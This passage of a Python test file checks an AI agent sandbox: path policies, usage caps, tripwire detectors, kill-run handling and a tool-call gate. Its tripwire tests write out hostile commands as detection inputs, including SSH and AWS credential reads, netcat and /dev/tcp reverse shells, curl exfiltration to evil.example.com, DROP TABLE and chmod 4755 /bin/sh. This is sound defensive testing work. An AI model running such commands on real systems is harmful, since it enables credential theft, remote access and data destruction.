    def test_relative_resolved_with_cwd(self):
        d = validate_path(
            "file.txt", _policy(fs_roots=("/tmp/agent/r1",), fs_write_roots=("/tmp/agent/r1",)),
            write=True, tool_name="w", cwd="/tmp/agent/r1",
        )
        assert d.decision == ALLOWED

    def test_no_roots_restricted(self):
        d = validate_path("/x/y", _policy(fs_roots=(), fs_write_roots=()), write=False, tool_name="t")
        assert d.decision == RESTRICTED

    def test_empty_policy_roots_allowed_when_tripwire_free(self):
        # fs_roots empty but path under nothing → RESTRICTED (recoverable), not blocked
        d = validate_path("/tmp/ok.txt", _policy(fs_roots=(), fs_write_roots=()), write=False, tool_name="t")
        assert d.decision == RESTRICTED


class TestFsValidate:
    def test_no_path_args_allowed(self):
        d = fs_validate(_policy(), "browser_click", {"selector": "#x"})
        assert d.decision == ALLOWED
        assert d.metadata_json["reason"] == "no_path_args"

    def test_allowed_single_path(self):
        d = fs_validate(_policy(), "read_codebase", {"file_path": "/workspace/data/a.txt"})
        assert d.decision == ALLOWED
        assert d.args_hash  # allowed results carry only the correlation hash

    def test_blocked_dominates(self):
        d = fs_validate(
            _policy(),
            "read_codebase",
            {"file_path": "/workspace/data/ok.txt", "output_path": "/etc/cron.d/evil"},
        )
        assert d.decision == BLOCKED
        assert d.metadata_json["arg_key"] == "output_path"

    def test_restricted_dominates_allowed(self):
        d = fs_validate(
            _policy(),
            "read_codebase",
            {"file_path": "/workspace/data/ok.txt", "output_path": "/elsewhere/x"},
        )
        assert d.decision == RESTRICTED

    def test_write_tool_uses_write_roots(self):
        d = fs_validate(_policy(), "write_code_file", {"file_path": "/workspace/data/x.log"})
        assert d.decision == RESTRICTED  # read root only

    def test_custom_write_tools(self):
        d = fs_validate(
            _policy(),
            "my_writer",
            {"file_path": "/workspace/data/x.log"},
            write_tools=("my_writer",),
        )
        assert d.decision == RESTRICTED

    def test_args_hash_correlates(self):
        d = fs_validate(_policy(), "read_codebase", {"file_path": "/etc/passwd"})
        assert d.args_hash
        assert len(d.args_hash) == 64


class TestRewritePath:
    def test_absolute_remapped(self, tmp_path):
        root = tmp_path / "sbx"
        out = rewrite_path_to_sandbox("/etc/passwd", str(root))
        assert str(root) in out
        assert out.endswith("passwd")
        assert root.exists()

    def test_relative_remapped(self, tmp_path):
        root = tmp_path / "sb"
        out = rewrite_path_to_sandbox("local.txt", str(root))
        assert out.endswith("local.txt")
        assert str(root) in out

    def test_relative_with_cwd(self, tmp_path):
        root = tmp_path / "sb"
        out = rewrite_path_to_sandbox("nested/f.txt", str(root), cwd="/ws")
        assert out == "/ws/nested/f.txt"

    def test_mkdir_oserror_tolerated(self, tmp_path):
        root = tmp_path / "as_file"
        root.write_text("x")  # root exists as a FILE → mkdir raises
        out = rewrite_path_to_sandbox("/a/b.txt", str(root))
        assert str(root) in out

    def test_nul_byte_value_error_returns_original(self, tmp_path):
        out = rewrite_path_to_sandbox("bad\x00path", str(tmp_path / "sbx"))
        assert out == "bad\x00path"


# ===========================================================================
# core/sandbox_caps.py
# ===========================================================================

class TestEstimators:
    def test_payload_char_count(self):
        from core.sandbox_caps import _payload_char_count
        assert _payload_char_count({"content": "abc", "code": b"xy"}, ("content", "code")) == 5
        assert _payload_char_count({"content": {"a": 1}, "data": [1, 2]}, ("content", "data")) == len(str({"a": 1})) + len(str([1, 2]))
        assert _payload_char_count({"other": "zzz"}, ("content",)) == 0

    def test_serialized_char_count_fallback(self):
        from core.sandbox_caps import _serialized_char_count
        assert _serialized_char_count({"command": "ls -la"}) == len('{"command": "ls -la"}')
        cyclic = {}
        cyclic["k"] = cyclic
        assert _serialized_char_count(cyclic) == 0

    def test_estimate_write_bytes_read_tool_zero(self):
        assert estimate_write_bytes("browser_click", {"content": "x" * 100}) == 0

    def test_estimate_write_bytes_mapped_content(self):
        assert estimate_write_bytes("write_code_file", {"code": "print(1)"}) == len("print(1)")
        assert estimate_write_bytes("browser_download_file", {"file_content": "x"}) == 1

    def test_estimate_write_bytes_serialized_fallback(self):
        n = estimate_write_bytes("device_execute_command", {"command": "echo hello"})
        assert n > 0

    def test_estimate_cost_llm_tool(self):
        assert estimate_cost_usd("llm_chat", {"prompt": "hello world"}) == 2e-05
        assert estimate_cost_usd("ask_image", {"question": "hi"}) == 1e-05

    def test_estimate_cost_non_llm_zero(self):
        assert estimate_cost_usd("browser_click", {"prompt": "whatever"}) == 0.0

    def test_estimate_tool_usage_happy(self):
        b, c = estimate_tool_usage("write_code_file", {"content": "abc"})
        assert b == 3
        assert c == 0.0

    def test_estimate_tool_usage_fail_open(self, monkeypatch):
        monkeypatch.setattr("core.sandbox_caps.estimate_write_bytes", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
        assert estimate_tool_usage("t", {}) == (0, 0.0)


class TestRunCounters:
    def test_incr_and_accrual(self):
        c = _RunCounters(run_id="r")
        assert c.incr_tool_calls() == 1
        assert c.add_bytes_written(100) == 100
        assert c.add_bytes_written(-5) == 100  # clamped
        assert c.add_cost(0.5) == 0.5
        assert c.add_cost(-1) == 0.5
        assert c.elapsed_seconds() >= 0
        assert c.run_id == "r"


class TestCounterRegistry:
    def test_singleton_and_get_release_reset(self):
        r1 = CounterRegistry()
        r2 = CounterRegistry()
        assert r1 is r2
        c = r1.get("run-x")
        assert c.run_id == "run-x"
        assert r1.get("run-x") is c
        r1.release("run-x")
        assert r1.get("run-x") is not c
        r1.release("run-x")  # no-op
        r1.reset()

    def test_get_registry_returns_singleton(self):
        assert get_registry() is CounterRegistry()


class TestCheckCaps:
    def _policy(self, **kw) -> SandboxPolicy:
        return _policy(
            max_tool_calls=kw.pop("max_tool_calls", 100),
            max_exec_seconds=kw.pop("max_exec_seconds", 0),
            max_bytes_written=kw.pop("max_bytes_written", 0),
            max_cost_usd=kw.pop("max_cost_usd", 0.0),
            **kw,
        )

    def setup_method(self, method):
        get_registry().reset()

    def teardown_method(self, method):
        get_registry().reset()

    def test_tool_call_cap_exceeded(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "true")
        get_registry().get("r1").tool_calls = 100
        d = check_caps(self._policy(max_tool_calls=100), tool_name="t", args={})
        assert d.decision == RESTRICTED
        assert d.violation_type == "cap_exceeded"
        assert d.metadata_json["cap"] == "max_tool_calls"
        assert d.enforced is True

    def test_exec_seconds_cap_exceeded(self, monkeypatch):
        counters = get_registry().get("r1")
        counters.exec_seconds_started_at -= 601
        d = check_caps(self._policy(max_exec_seconds=600), tool_name="t", args={})
        assert d.decision == RESTRICTED
        assert d.metadata_json["cap"] == "max_exec_seconds"

    def test_bytes_written_cap_exceeded(self):
        d = check_caps(
            self._policy(max_bytes_written=100),
            tool_name="write_code_file",
            args={"content": "x" * 100},
        )
        assert d.decision == RESTRICTED
        assert d.metadata_json["cap"] == "max_bytes_written"

    def test_cost_cap_exceeded(self):
        d = check_caps(
            self._policy(max_cost_usd=0.00001),
            tool_name="llm_chat",
            args={"prompt": "y" * 8},
        )
        assert d.decision == RESTRICTED
        assert d.metadata_json["cap"] == "max_cost_usd"

    def test_allowed_accrues_with_cap_enabled(self):
        d = check_caps(
            self._policy(max_tool_calls=100, max_bytes_written=1000, max_cost_usd=1.0),
            tool_name="write_code_file",
            args={"content": "abcd"},
            args_hash="h",
        )
        assert d.decision == ALLOWED
        assert d.args_hash == "h"
        assert d.metadata_json["tool_calls_after_incr"] == 1
        assert d.metadata_json["bytes_written"] == 4

    def test_allowed_accrues_cost_with_cap_enabled(self):
        d = check_caps(
            self._policy(max_tool_calls=100, max_cost_usd=1.0),
            tool_name="llm_chat",
            args={"prompt": "hello world"},
        )
        assert d.decision == ALLOWED
        assert d.metadata_json["tool_calls_after_incr"] == 1
        assert d.metadata_json["cost_usd"] == 2e-05

    def test_allowed_with_zero_caps_uses_helper_branch(self):
        d = check_caps(
            self._policy(max_tool_calls=0, max_exec_seconds=0, max_bytes_written=0, max_cost_usd=0.0),
            tool_name="llm_chat",
            args={"prompt": "zz"},
        )
        assert d.decision == ALLOWED
        assert d.metadata_json["tool_calls_after_incr"] == 1
        assert d.metadata_json["cost_usd"] == 1e-05

    def test_allowed_with_zero_caps_accrues_bytes_via_helpers(self):
        d = check_caps(
            self._policy(max_tool_calls=0, max_exec_seconds=0, max_bytes_written=0, max_cost_usd=0.0),
            tool_name="write_code_file",
            args={"content": "abcd"},
        )
        assert d.decision == ALLOWED
        assert d.metadata_json["bytes_written"] == 4

    def test_in_lock_race_recheck_blocks(self, monkeypatch):
        class RacyCounters:
            def __init__(self):
                self._reads = 0
                self.lock = threading.Lock()
                self.bytes_written = 0
                self.cost_usd = 0.0

            @property
            def tool_calls(self):
                self._reads += 1
                return self._reads - 1

            def elapsed_seconds(self):
                return 0.0

        fake_registry = MagicMock()
        fake_registry.get.return_value = RacyCounters()
        monkeypatch.setattr("core.sandbox_caps.get_registry", lambda: fake_registry)
        d = check_caps(self._policy(max_tool_calls=1), tool_name="t", args={})
        assert d.decision == RESTRICTED
        assert d.metadata_json["cap"] == "max_tool_calls"

    def test_exception_fails_open(self, monkeypatch):
        monkeypatch.setattr(
            "core.sandbox_caps.estimate_tool_usage",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        d = check_caps(self._policy(), tool_name="t", args={})
        assert d.decision == ALLOWED
        assert "error" in d.metadata_json


class TestRecorders:
    def setup_method(self, method):
        get_registry().reset()

    def teardown_method(self, method):
        get_registry().reset()

    def test_record_write_and_cost(self):
        p = _policy(run_id="r1")
        record_write(p, 42)
        record_cost(p, 0.25)
        c = get_registry().get("r1")
        assert c.bytes_written == 42
        assert c.cost_usd == 0.25

    def test_record_exceptions_contained(self, monkeypatch):
        monkeypatch.setattr("core.sandbox_caps.get_registry", lambda: (_ for _ in ()).throw(RuntimeError("x")))
        record_write(_policy(), 1)
        record_cost(_policy(), 1.0)
        release_run("r1")


# ===========================================================================
# core/sandbox_tripwire.py
# ===========================================================================

class TestTripwireRegistry:
    def test_all_patterns_exposed(self):
        pats = all_patterns()
        assert pats
        assert all(isinstance(p, TripwirePattern) for p in pats)
        assert any(p.id == "cred_ssh_key" for p in pats)

    def test_match_credential_reads(self):
        assert match({"command": "cat ~/.ssh/id_rsa"}).id == "cred_ssh_key"
        assert match({"command": "head /home/x/.aws/credentials"}).id == "cred_aws"
        assert match({"command": "tail /app/.env"}).id == "cred_env_file"
        assert match({"command": "env TOKEN=abc"}).id == "cred_env_var_dump"

    def test_match_destructive(self):
        assert match({"sql": "DROP TABLE users"}).id == "destructive_drop_table"
        assert match({"sql": "DELETE FROM UserTable"}).id == "destructive_delete_users"
        assert match({"sql": "TRUNCATE TABLE logs"}).id == "destructive_delete_users"
        assert match({"sql": "ALTER TABLE t DROP COLUMN c"}).id == "destructive_drop_column"

    def test_match_privilege(self):
        assert match({"cmd": "usermod -aG sudo bob"}).id == "priv_usermod"
        assert match({"cmd": "chmod 4755 /bin/sh"}).id == "priv_setuid"
        assert match({"cmd": "sudo rm -rf /"}).id == "priv_sudo_unsafe"

    def test_match_cron(self):
        assert match({"cmd": "crontab -e"}).id == "cron_edit"
        assert match({"cmd": "systemctl enable backup.timer"}).id == "cron_systemd_timer"

    def test_match_admin(self):
        assert match({"sql": "GRANT ALL ON db TO bob"}).id == "admin_grant_sql"
        assert match({"cmd": "aws iam AttachRolePolicy --role-name r"}).id == "admin_iam_attach"

    def test_match_reverse_shells(self):
        assert match({"cmd": "bash -i"}).id == "rshell_bash_i"
        assert match({"cmd": "nc -e /bin/sh host 4444"}).id == "rshell_nc_exec"
        assert match({"cmd": "socat TCP:10.0.0.1:80 EXEC:/bin/sh"}).id == "rshell_nc_exec"
        assert match({"cmd": "echo hi > /dev/tcp/10.0.0.1/80"}).id == "rshell_dev_tcp"
        assert match({"code": "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"}).id == "rshell_python_socket"

    def test_match_exfil(self):
        assert match({"cmd": "curl https://evil.example.com/steal"}).id == "exfil_curl_to_external"
        assert match({"cmd": "wget http://attacker.io/x"}).id == "exfil_curl_to_external"
        assert match({"cmd": "curl https://api.anthropic.com/v1/messages"}) is None
        assert match({"cmd": "curl -s https://pypi.org/simple/"}) is None

    def test_match_nested_args(self):
        hit = match({"nested": {"list": [1, 2], "cmd": "cat /root/.ssh/id_rsa"}})
        assert hit is not None

    def test_match_no_text_none(self):
        assert match({}) is None
        assert match(None) is None

    def test_match_no_hit_none(self):
        assert match({"cmd": "ls -la"}) is None

    def test_match_regex_error_tolerated(self, monkeypatch):
        class BrokenRegex:
            def search(self, text):
                import re
                raise re.error("bad pattern")

        pat = TripwirePattern(id="broken", category="X", regex=BrokenRegex(), description="d")
        monkeypatch.setattr("core.sandbox_tripwire._TRIPWIRES", (pat,))
        assert match({"cmd": "anything"}) is None


class TestAstChecker:
    def test_forbidden_import(self):
        assert "os" in check_python_ast("import os\nprint(1)")
        assert "sys" in check_python_ast("import sys")

    def test_forbidden_import_from(self):
        assert "subprocess" in check_python_ast("from subprocess import call")

    def test_benign_imports_ok(self):
        assert check_python_ast("import json\nimport re\nx = 1") is None

    def test_forbidden_builtin_calls(self):
        for src in ("eval('1+1')", "exec('x')", "open('/etc/passwd')", "__import__('os')"):
            assert check_python_ast(src) is not None
        assert "getattr" in check_python_ast("getattr(os, 'system')")
        assert check_python_ast("getattr(foo, 'bar')") is None

    def test_forbidden_attribute_calls(self):
        assert "os.system" in check_python_ast("os.system('ls')")
        assert "subprocess" in check_python_ast("subprocess.call(['ls'])")

    def test_dunder_class_traversal_call(self):
        assert "dunder-class" in check_python_ast("(1).__class__.__base__.__subclasses__()")

    def test_dunder_load_attribute_pass_branch(self):
        # Attribute access with ctx=Load that is NOT a call → the pass branch.
        assert check_python_ast("a = (1).__class__") is None

    def test_globals_subscript_reflection(self):
        assert "globals" in check_python_ast("globals['__builtins__']['eval']")
        assert "locals" in check_python_ast("locals['x']")

    def test_os_environ_secret_subscript(self):
        assert "AWS" in check_python_ast("os.environ['AWS_SECRET_ACCESS_KEY']")
        assert check_python_ast("os.environ['PATH']") is None

    def test_syntax_error_with_js_marker_routes_to_js(self):
        assert check_python_ast("const x = 1;") is None  # JS, no JS tripwire pattern

    def test_syntax_error_prose_no_tripwire(self):
        assert check_python_ast("just some prose mentioning process.env.SECRET") is None

    def test_check_js_ast_patterns(self):
        assert "eval()" in check_js_ast("eval(x)")
        assert "Function" in check_js_ast("new Function('return 1')")
        assert "child_process" in check_js_ast("require('child_process').exec('ls')")
        assert "process.env" in check_js_ast("process.env.SECRET_TOKEN")
        assert check_js_ast("console.log('hi')") is None

    def test_check_ast_violations_walk(self):
        from core.sandbox_tripwire import _check_ast_violations
        assert _check_ast_violations({"prompt": "def f():\n    return eval('1')"}) is not None
        assert _check_ast_violations({"nested": [{"code": "import os"}]}) is not None
        assert _check_ast_violations({"short": "hi"}) is None
        assert _check_ast_violations({"num": 42}) is None
        assert _check_ast_violations(None) is None


class TestTripwireCheck:
    def test_ast_violation_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "false")
        d = check(tool_name="t", args={"code": "import os"})
        assert d.decision == BLOCKED
        assert d.killrun_triggered is True
        assert d.metadata_json["category"] == "AST_INVARIANT"

    def test_regex_hit_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "false")
        d = check(tool_name="t", args={"cmd": "DROP TABLE users"}, args_hash="h")
        assert d.decision == BLOCKED
        assert d.violation_type == "tripwire"
        assert d.args_hash == "h"
        assert d.killrun_triggered is True
        assert "DROP" in d.violation_detail
        assert d.metadata_json["tripwire_id"] == "destructive_drop_table"

    def test_allowed_when_no_hit(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "false")
        d = check(tool_name="t", args={"cmd": "ls -la"})
        assert d.decision == ALLOWED
        assert d.phase == "C"

    def test_exception_fails_closed_under_enforcement(self, monkeypatch, caplog):
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "true")
        monkeypatch.setattr(
            "core.sandbox_tripwire._check_ast_violations",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        d = check(tool_name="t", args={})
        assert d.decision == BLOCKED
        assert d.enforced is True
        assert d.metadata_json["fail_closed"] is True
        assert any("failing CLOSED" in r.message for r in caplog.records)

    def test_exception_fails_open_in_shadow(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "false")
        monkeypatch.setattr(
            "core.sandbox_tripwire.match",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        d = check(tool_name="t", args={"cmd": "ls"})
        assert d.decision == ALLOWED
        assert "error" in d.metadata_json


class TestMegafile:
    def test_warning_proposal_format(self):
        w = MegafileWarning(
            file_path="/tmp/big.py", line_count=900, edit_count=6,
            threshold_loc=800, threshold_edits=5, severity="CRITICAL",
            recommendation="decompose",
        )
        p = w.to_harness_patch_proposal()
        assert p["patch_id"] == "megafile_big"
        assert p["target_component"] == "file_modularization"
        assert p["mutation_payload"]["action"] == "decompose_into_modules"
        assert p["severity"] == "CRITICAL"

    def test_record_edit_below_thresholds(self):
        det = MegafileDetector(loc_threshold=800, edit_threshold=5)
        assert det.record_edit("/tmp/f.py", line_count=100) is None

    def test_record_edit_loc_warning(self):
        det = MegafileDetector(loc_threshold=10, edit_threshold=5)
        w = det.record_edit("/nonexistent/f.py", line_count=50)
        assert w is not None
        assert w.severity == "WARNING"
        assert "50 LOC" in w.recommendation

    def test_record_edit_edit_count_warning(self):
        det = MegafileDetector(loc_threshold=800, edit_threshold=3)
        det.record_edit("/nonexistent/f.py")
        det.record_edit("/nonexistent/f.py")
        w = det.record_edit("/nonexistent/f.py")
        assert w is not None
        assert w.severity == "WARNING"
        assert "3 edits" in w.recommendation

    def test_record_edit_both_critical(self):
        det = MegafileDetector(loc_threshold=10, edit_threshold=2)
        det.record_edit("/nonexistent/f.py")
        w = det.record_edit("/nonexistent/f.py", line_count=100)
        assert w.severity == "CRITICAL"
        assert w.line_count == 100
        assert w.edit_count == 2
        assert "hotspot megafile" in w.recommendation

    def test_existing_path_resolved(self, tmp_path):
        f = tmp_path / "real.py"
        f.write_text("x")
        det = MegafileDetector(loc_threshold=0, edit_threshold=0)
        w = det.record_edit(str(f), line_count=1)
        assert w.file_path == str(f.resolve())

    def test_is_blocked(self):
        det = MegafileDetector(loc_threshold=800, edit_threshold=2)
        assert det.is_blocked("/nonexistent/g.py") is False
        det.record_edit("/nonexistent/g.py")
        det.record_edit("/nonexistent/g.py")
        assert det.is_blocked("/nonexistent/g.py") is True

    def test_reset_and_summary(self):
        det = MegafileDetector()
        det.record_edit("/b.py")
        det.record_edit("/a.py")
        det.record_edit("/a.py")
        s = det.summary()
        assert s[0]["file"] == "/a.py"
        assert s[0]["edits"] == 2
        det.reset()
        assert det.summary() == []
        assert det._edit_counts == {}


# ===========================================================================
# core/sandbox_killrun.py
# ===========================================================================

class TestKillRunRegistry:
    def test_singleton(self):
        a = KillRunRegistry()
        b = KillRunRegistry()
        assert a is b
        assert get_killrun_registry() is a

    def test_trigger_and_state(self):
        reg = get_killrun_registry()
        reg.reset()
        state = reg.trigger("run1", "bad action", tripwire_id="t1", evidence={"k": "v"})
        assert state.run_id == "run1"
        assert state.reason == "bad action"
        assert state.tripwire_id == "t1"
        assert state.evidence == {"k": "v"}
        assert reg.is_killed("run1") is True
        assert reg.get_state("run1") is state
        assert reg.get_state("unknown") is None
        reg.reset()

    def test_trigger_idempotent_first_wins(self):
        reg = get_killrun_registry()
        reg.reset()
        s1 = reg.trigger("run2", "first")
        s2 = reg.trigger("run2", "second", tripwire_id="t2")
        assert s1 is s2
        assert s2.reason == "first"
        assert s2.tripwire_id is None
        reg.reset()

    def test_release_and_reset(self):
        reg = get_killrun_registry()
        reg.trigger("run3", "x")
        reg.release("run3")
        assert reg.is_killed("run3") is False
        reg.release("run3")  # no-op
        reg.trigger("run4", "x")
        reg.reset()
        assert reg.is_killed("run4") is False

    def test_killrun_aborted_is_exception(self):
        exc = KillRunAborted("msg")
        assert isinstance(exc, Exception)
        assert str(exc) == "msg"


class TestTriggerKillrun:
    def setup_method(self, method):
        get_killrun_registry().reset()

    def teardown_method(self, method):
        get_killrun_registry().reset()

    def test_updates_execution_row(self):
        db = MagicMock()
        exec_row = MagicMock()
        db.query.return_value.filter.return_value.first.return_value = exec_row
        trigger_killrun("run1", "reason", tripwire_id="t1", evidence={"e": 1}, db=db, execution_id="exec-1")
        assert db.query.call_args.args[0].__name__ == "AgentExecution"
        db.query.return_value.filter.assert_called_once()
        assert exec_row.status == "killed_sandbox"
        db.commit.assert_called_once()
        assert get_killrun_registry().is_killed("run1")
        assert get_killrun_registry().get_state("run1").tripwire_id == "t1"

    def test_missing_execution_row_no_commit(self):
        db = MagicMock()
        db.query.return_value.filter.return_value.first.return_value = None
        trigger_killrun("run2", "x", db=db)
        db.commit.assert_not_called()

    def test_owned_session_closed(self):
        session = MagicMock()
        session.query.return_value.filter.return_value.first.return_value = None
        with patch("core.database.SessionLocal", return_value=session):
            trigger_killrun("run3", "x")
        session.close.assert_called_once()

    def test_db_error_never_raises(self, caplog):
        db = MagicMock()
        db.query.side_effect = RuntimeError("db down")
        trigger_killrun("run4", "x", db=db)  # must not raise
        assert any("KillRun DB update failed" in r.message for r in caplog.records)

    def test_registry_error_never_raises(self, caplog):
        with patch("core.sandbox_killrun.get_registry", side_effect=RuntimeError("boom")):
            trigger_killrun("run5", "x")
        assert any("KillRun trigger failed" in r.message for r in caplog.records)


class TestKillRunGuard:
    def setup_method(self, method):
        get_killrun_registry().reset()

    def teardown_method(self, method):
        get_killrun_registry().reset()

    def test_guard_raises_for_killed_run(self):
        get_killrun_registry().trigger("run1", "tripwire fired", tripwire_id="t1")
        with pytest.raises(KillRunAborted) as ei:
            guard("run1")
        assert "run1" in str(ei.value)
        assert "tripwire fired" in str(ei.value)

    def test_guard_noop_unknown_run(self):
        guard("ghost")  # must not raise

    def test_guard_noop_empty_run_id(self):
        guard("")
        guard(None)

    def test_is_killed_predicate(self):
        assert is_killed("run1") is False
        get_killrun_registry().trigger("run1", "x")
        assert is_killed("run1") is True
        assert is_killed("") is False
        assert is_killed(None) is False


# ===========================================================================
# core/sandbox_gate.py
# ===========================================================================

def _gate_context(**kw) -> dict:
    ctx = dict(
        run_id="run1",
        tier_at_issuance="supervised",
        agent_id="a1",
        tenant_id="t1",
        workspace_id="w1",
        user_id="u1",
        session_id="s1",
    )
    ctx.update(kw)
    return ctx


class TestGateShortCircuits:
    def test_sandbox_disabled_returns_none(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "false")
        assert evaluate_tool_call("t", {}, _gate_context()) is None

    def test_no_run_id_returns_none(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        assert evaluate_tool_call("t", {}, _gate_context(run_id=None)) is None

    def test_execution_id_fallback(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        with patch("core.sandbox_audit.write_violation") as wv:
            d = evaluate_tool_call(
                "browser_click", {"selector": "#x"},
                _gate_context(run_id=None, execution_id="exec1"),
            )
        assert d is not None
        wv.assert_not_called()

    def test_no_tier_returns_none(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        assert evaluate_tool_call("t", {}, _gate_context(tier_at_issuance=None, tier=None)) is None


class TestGateEvaluation:
    def _call(self, tool_name, args, ctx=None, monkeypatch=None, **env):
        env.setdefault("ATOM_SANDBOX_ENABLED", "true")
        for k, v in env.items():
            monkeypatch.setenv(k, v)
        with patch("core.sandbox_audit.write_violation") as wv:
            d = evaluate_tool_call(tool_name, args, ctx or _gate_context())
        return d, wv

    def test_allowed_tool_full_pass(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        d, wv = self._call("browser_click", {"selector": "#x"}, monkeypatch=monkeypatch)
        assert d.decision == ALLOWED
        assert d.phase == "A"
        wv.assert_not_called()

    def test_tool_not_in_whitelist_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_WHITELIST_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "false")
        with patch("core.sandbox_audit.write_violation") as wv:
            d = evaluate_tool_call(
                "shell", {"cmd": "ls"}, _gate_context(tier_at_issuance="student")
            )
        assert d.decision == BLOCKED
        assert d.violation_type == VT_TOOL_WHITELIST
        assert d.metadata_json["tier"] == "student"
        wv.assert_called_once()
        assert wv.call_args.kwargs["run_id"] == "run1"
        assert wv.call_args.kwargs["tenant_id"] == "t1"

    def test_whitelist_disabled_short_circuit(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_WHITELIST_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "false")
        d, _ = self._call("anything", {"x": 1}, monkeypatch=monkeypatch)
        assert d.decision == ALLOWED
        assert d.metadata_json["reason"] == "whitelist_disabled"

    def test_fs_restricted_upgrades_decision(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "false")
        d, wv = self._call("browser_screenshot", {"file_path": "/etc/passwd"}, monkeypatch=monkeypatch)
        assert d.decision == BLOCKED
        assert d.phase == "B"
        wv.assert_called_once()

    def test_fs_restricted_out_of_scope(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "false")
        d, wv = self._call("browser_screenshot", {"file_path": "/elsewhere/x"}, monkeypatch=monkeypatch)
        assert d.decision == RESTRICTED
        wv.assert_called_once()

    def test_tripwire_hit_triggers_killrun_when_enforced(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "true")
        with patch("core.sandbox_audit.write_violation") as wv, \
             patch("core.sandbox_killrun.trigger_killrun") as tk:
            d = evaluate_tool_call("browser_screenshot", {"cmd": "DROP TABLE users"}, _gate_context())
        assert d.decision == BLOCKED
        tk.assert_called_once()
        args = tk.call_args
        assert args.args[0] == "run1"
        assert "DROP" in args.kwargs["reason"]
        assert args.kwargs["tripwire_id"] == "destructive_drop_table"
        wv.assert_called_once()

    def test_tripwire_hit_no_killrun_in_shadow(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "false")
        with patch("core.sandbox_audit.write_violation") as wv, \
             patch("core.sandbox_killrun.trigger_killrun") as tk:
            d = evaluate_tool_call("browser_screenshot", {"cmd": "DROP TABLE users"}, _gate_context())
        assert d.decision == BLOCKED
        tk.assert_not_called()
        wv.assert_called_once()

    def test_caps_restricted(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "true")
        from core.sandbox_caps import get_registry as caps_reg
        caps_reg().reset()
        caps_reg().get("run1").tool_calls = 200
        monkeypatch.setenv("ATOM_SANDBOX_MAX_TOOL_CALLS", "200")
        try:
            d, wv = self._call("browser_click", {}, monkeypatch=monkeypatch)
        finally:
            caps_reg().reset()
        assert d.decision == RESTRICTED
        assert d.metadata_json["cap"] == "max_tool_calls"
        wv.assert_called_once()

    def test_egress_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_TRIPWIRES_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_CAPS_ENABLED", "false")
        monkeypatch.setenv("ATOM_SANDBOX_EGRESS_ENABLED", "true")
        d, wv = self._call(
            "browser_screenshot", {"url": "https://evil.example.com/steal"}, monkeypatch=monkeypatch
        )
        assert d.decision == BLOCKED
        assert d.phase == "D"
        wv.assert_called_once()

    def test_killed_run_returns_blocked_decision(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
